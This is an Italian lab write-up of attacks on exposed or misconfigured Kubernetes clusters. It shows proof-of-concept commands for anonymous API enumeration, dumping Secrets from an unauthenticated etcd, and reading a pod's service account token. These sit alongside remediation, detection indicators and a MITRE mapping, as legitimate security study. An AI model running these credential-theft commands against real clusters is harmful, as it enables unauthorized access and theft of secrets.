> [English](README.en.md) | **Italiano**

# Kubernetes Attacks - Cluster Esposti e Mal Configurati

> - **Fase:** Cloud Security - Kubernetes Attack (Orchestration)
> - **Visibilita:** Media - le chiamate all'API server sono nell'audit log del cluster (se abilitato); kube-hunter genera traffico di scansione rilevabile
> - **Prerequisiti:** Un cluster K8s raggiungibile (API server, kubelet, etcd esposti) o un accesso iniziale (pod compromesso, token di service account); kubectl, kube-hunter
> - **Output:** Finding CLOUD-007; accesso al cluster; furto di segreti; esecuzione di workload; potenziale controllo del cluster

- **Ambiente Operativo:** Cluster Kubernetes di laboratorio dell'autore, kubectl
- **Tool principali:** kubectl, kube-hunter, etcdctl

---

## Executive Summary

Kubernetes (K8s) e il sistema operativo del cloud moderno: orchestra migliaia di container su cluster di nodi, gestendo deployment, rete, storage e segreti. Questa centralita lo rende un bersaglio ad altissimo valore: compromettere il cluster significa controllare tutti i workload che vi girano. E anche una superficie d'attacco vasta e complessa, con molti componenti esposti e molte configurazioni da sbagliare.

I vettori principali riguardano i componenti del control plane. L'**API server** (`kube-apiserver`) e il cervello del cluster; se esposto e con accesso anonimo abilitato, permette di interrogare e manipolare il cluster senza credenziali. L'**etcd** e il database che contiene tutto lo stato del cluster, inclusi i segreti in chiaro; un etcd non autenticato ed esposto e la compromissione totale del cluster. Il **kubelet** su ogni nodo, se esposto, permette di eseguire comandi nei pod. Il finding CLOUD-007 documenta lo sfruttamento di queste esposizioni.

Un secondo vettore parte dall'interno: un pod compromesso (via RCE su un'app) contiene per default un token di service account montato, che puo dare accesso all'API del cluster. Da li, con RBAC mal configurato, si arriva all'escalation. **kube-hunter** e lo strumento di ricognizione che scopre queste debolezze da fuori o da dentro il cluster.

---

## Struttura della cartella

```
K8s-attacks/
+-- README.md      # questo file: attacchi a cluster esposti/mal configurati (CLOUD-007)
+-- img/           # kube-hunter e accesso etcd/API
```

---

## Sfruttamento di un Cluster Esposto

**ID Finding:** `CLOUD-007` | **Severity:** `Critico` (accesso non autorizzato al control plane; etcd/API esposti = furto dei segreti e controllo del cluster)

### Contesto operativo

Un cluster K8s espone diversi servizi di rete. Se non protetti (autenticazione, autorizzazione, network policy), diventano vie d'accesso: l'API server con accesso anonimo, l'etcd senza autenticazione, il kubelet aperto. kube-hunter automatizza la scoperta di queste esposizioni; kubectl ed etcdctl le sfruttano.

### PoC - Fase 1: Ricognizione con kube-hunter

```Bash
# kube-hunter cerca componenti K8s esposti e vulnerabilita note
kube-hunter --remote <cluster-ip>
```

```
[+] Kubernetes API Server         open at <ip>:6443
[!] Anonymous access to API       -> ENABLED               <-- accesso anonimo (CLOUD-007)
[!] Etcd is accessible            at <ip>:2379 (no auth)   <-- etcd esposto (CLOUD-007)
[+] Kubelet API                   open at <node>:10250
```

### PoC - Fase 2: Accesso anonimo all'API server

```Bash
# Se l'accesso anonimo e abilitato: enumerazione del cluster senza credenziali
kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify get pods -A
```

```
NAMESPACE    NAME                 STATUS
kube-system  etcd-master          Running
production   web-app-7d9f...      Running                  <-- workload enumerati (CLOUD-007)
```

### PoC - Fase 3: Furto dei segreti da etcd esposto

```Bash
# etcd contiene tutto lo stato del cluster, inclusi i Secret in chiaro
etcdctl --endpoints=http://<ip>:2379 get / --prefix --keys-only | grep secret
etcdctl --endpoints=http://<ip>:2379 get /registry/secrets/production/db-credentials
```

```
# I Secret di Kubernetes sono solo base64, non cifrati by default in etcd
data: { "password": "UGFzc3cwcmQh" }   <-- credenziali del DB in chiaro (CLOUD-007)
# etcd esposto = tutti i segreti del cluster compromessi
```

### PoC - Fase 4: Escalation da un pod compromesso

```Bash
# Da un pod compromesso: il token del service account e montato di default
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Se il SA ha permessi eccessivi (RBAC mal configurato) -> controllo del cluster
kubectl --token=<token> auth can-i --list
```

```
Resources    Verbs
pods         create,delete    <-- puo creare pod
secrets      get,list         <-- puo leggere tutti i segreti (CLOUD-007)
# un SA sovraprivilegiato in un pod bucato = escalation al cluster
```

### Remediation

- **Nessun accesso anonimo:** disabilitare l'anonymous auth sull'API server; autenticazione e autorizzazione (RBAC) obbligatorie
- **Proteggere etcd:** autenticazione mutua TLS su etcd, mai esposto in rete; abilitare la cifratura dei Secret a riposo (encryption at rest), altrimenti sono solo base64
- **RBAC a minimo privilegio:** i service account devono avere permessi minimi; non montare il token dove non serve (`automountServiceAccountToken: false`)
- **Network policy e hardening:** limitare l'accesso di rete ai componenti del control plane; kubelet autenticato; audit log abilitato; auditing con kube-bench (`../K8s-auditing/`)

---

## Esperienza di Laboratorio

L'esposizione di etcd e stata la scoperta piu impressionante per la sua totalita. I Secret di Kubernetes sono spesso percepiti come "sicuri" perche gestiti dal cluster, ma in etcd - senza la cifratura a riposo, che non e attiva di default - sono solo base64, cioe in chiaro. Un etcd raggiungibile senza autenticazione consegna ogni segreto del cluster in un comando. Questo ha reso concreto che "Secret" in Kubernetes non significa "cifrato": significa "oggetto di tipo Secret", una distinzione che cambia tutto sul piano difensivo.

kube-hunter ha reso la ricognizione quasi banale, evidenziando la vastita della superficie K8s. Un cluster non e un servizio ma un insieme di componenti (API server, etcd, kubelet, scheduler, controller) ognuno con la sua porta e la sua configurazione di sicurezza. Ognuno e un potenziale punto d'ingresso, e la sicurezza del cluster e quella del componente peggio configurato. La complessita di Kubernetes e, come per IAM, essa stessa una fonte di rischio.

Il vettore del token di service account ha collegato l'attacco al resto del percorso. Un pod che esegue un'app web bucata (modulo 03) monta di default un token che, se il service account e sovraprivilegiato, da accesso all'API del cluster. Un RCE su un container non resta confinato: via token e RBAC permissivo, diventa una via verso il control plane. Questo ha mostrato che la sicurezza dei workload e la sicurezza del cluster sono inseparabili.

---

## Analisi Teorica: La Complessita come Superficie d'Attacco

Kubernetes esemplifica un principio ricorrente nel cloud: la complessita e essa stessa una vulnerabilita. Un cluster ha decine di componenti, centinaia di oggetti di configurazione, un sistema di autorizzazione (RBAC) granulare ma intricato, e molteplici layer di rete. Ogni elemento e configurabile in modo sicuro, ma lo spazio delle configurazioni e cosi vasto che l'errore diventa probabile. La sicurezza non dipende da un singolo controllo ma dalla correttezza simultanea di molti, e basta un componente esposto per compromettere l'insieme.

Il caso di etcd illustra un secondo principio: i default non sono sempre sicuri. La cifratura dei Secret a riposo non e attiva di default in Kubernetes; chi non la abilita esplicitamente ha i segreti in chiaro in etcd. Questo contraddice l'assunzione intuitiva che un oggetto chiamato "Secret" sia protetto. La lezione e che nel cloud non si puo dedurre la sicurezza dal nome o dall'aspettativa: va verificata nella configurazione effettiva. "Secret" e una promessa che va mantenuta con la cifratura, non una garanzia implicita.

Il vettore del service account, infine, mostra la trasmissione della fiducia nei sistemi complessi. Un pod eredita un'identita (il service account) con i suoi permessi; se quell'identita e sovraprivilegiata, ogni pod che la usa e un potenziale punto di escalation. E lo stesso principio delle managed identity di Azure e dei service account di GCP: le identita non umane legate ai workload sono comode ma trasferiscono la fiducia al workload, e un workload compromesso eredita l'identita. Il least privilege applicato ai service account e, anche qui, la difesa fondamentale - perche in un sistema dove tutto e connesso, ogni privilegio eccessivo e una via di propagazione.

---

## Scenario Reale: Proiezione Post-Exploitation

> Prospettiva dell'attaccante e del difensore in un engagement reale.

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** accesso al control plane di un cluster K8s (via API anonima, etcd esposto o token sovraprivilegiato) (CLOUD-007).

**Kill Chain proiettata:**

```
[CLOUD-007] Cluster esposto/mal configurato -> accesso al control plane
        |
        v
Furto dei Secret (etcd/API) -> credenziali di DB, cloud, registry
        |
        v
Deploy di pod malevoli -> esecuzione di codice su tutti i nodi
        |
        v
Escape dal pod all'host (CLOUD-006) -> controllo dei nodi
        |
        v
Controllo del cluster + pivot cloud (i Secret contengono credenziali cloud)
```

**Impatto potenziale:** il controllo di un cluster K8s equivale al controllo di tutti i workload che orchestra - le loro app, i loro dati, i loro segreti. I Secret rubati contengono frequentemente credenziali verso altri sistemi (database, provider cloud, registry), rendendo il cluster un trampolino verso l'intera infrastruttura. La capacita di deployare pod arbitrari da esecuzione di codice su ogni nodo, e l'abuso delle risorse (cryptomining su cluster) e un vettore di monetizzazione comune.

### Prospettiva Difensore (Blue Team)

**Rilevamento:** l'audit log dell'API server (se abilitato) registra le chiamate anomale; Falco rileva comportamenti sospetti nei pod; il traffico di kube-hunter e le chiamate a etcd/kubelet da fonti inattese sono indicatori.

**Indicatori di Compromissione (IOC):**
- Chiamate all'API server da identita anonime o inattese
- Accesso a etcd da fuori il control plane
- Creazione di pod privilegiati o in namespace di sistema
- Enumerazione massiva di Secret; uso di token di service account da contesti anomali

**Contenimento e hardening:**
- Disabilitare l'accesso anonimo; RBAC a minimo privilegio; `automountServiceAccountToken: false` dove non serve
- etcd con TLS mutuo e mai esposto; cifratura dei Secret a riposo
- Network policy sul control plane; audit log abilitato; Pod Security Standards
- Auditing continuo con kube-bench (`../K8s-auditing/`) e runtime detection con Falco

**Lezione difensiva:** in Kubernetes, la sicurezza e la somma di molte configurazioni corrette, e la complessita rende l'audit sistematico indispensabile. Nessun umano puo verificare a mano la postura di un cluster reale; strumenti come kube-bench (CIS) e kube-hunter (dal lato offensivo) sono necessari per trovare le esposizioni prima dell'attaccante. La difesa del cluster e, prima di tutto, la disciplina della configurazione verificata.

---

## Tool di riferimento

| Tool | Tipo | Ruolo | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `kubectl` | K8s CLI | Ufficiale | Interazione con l'API del cluster |
| `kube-hunter` | Recon/scanner | Offensivo | Scoperta di componenti esposti e vulnerabilita |
| `etcdctl` | etcd CLI | Offensivo/Admin | Accesso diretto a etcd (furto Secret se esposto) |
| `kube-bench` | CIS auditing | Difensivo | Verifica CIS del cluster (`../K8s-auditing/`) |
| `Falco` | Runtime security | Difensivo | Detection a runtime dei comportamenti anomali |
| `Peirates` | Exploitation | Offensivo | Framework di post-exploitation per K8s |

> **Tool moderno consigliato:** `kube-hunter` per la ricognizione offensiva, `Peirates` per la post-exploitation. Difensivamente, `kube-bench` per l'audit CIS e `Falco` per la runtime detection. La simmetria offensivo/difensivo e forte: kube-hunter trova cio che kube-bench aiuta a correggere.

---

## Mappatura MITRE ATT&CK

> Riferimento: MITRE ATT&CK for Containers.

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Initial Access | Exploit Public-Facing Application | `T1190` | Accesso al cluster via API/etcd/kubelet esposti (CLOUD-007) |
| Credential Access | Unsecured Credentials: Container API | `T1552.007` | Furto dei token/Secret dall'API o da etcd (CLOUD-007) |
| Discovery | Container and Resource Discovery | `T1613` | Enumerazione di pod, namespace, Secret del cluster |
| Execution | Deploy Container | `T1610` | Deploy di pod malevoli per eseguire codice sui nodi |
| Privilege Escalation | Valid Accounts / RBAC abuse | `T1078` | Escalation via service account sovraprivilegiato |

---

> **Nota:** Tutte le attivita documentate sono state condotte su un cluster Kubernetes di laboratorio di proprieta dell'autore. L'accesso non autorizzato a cluster di terzi costituisce reato (accesso abusivo). Il test di sicurezza su Kubernetes richiede autorizzazione esplicita. Le tecniche sono documentate a scopo educativo e di security assessment autorizzato.
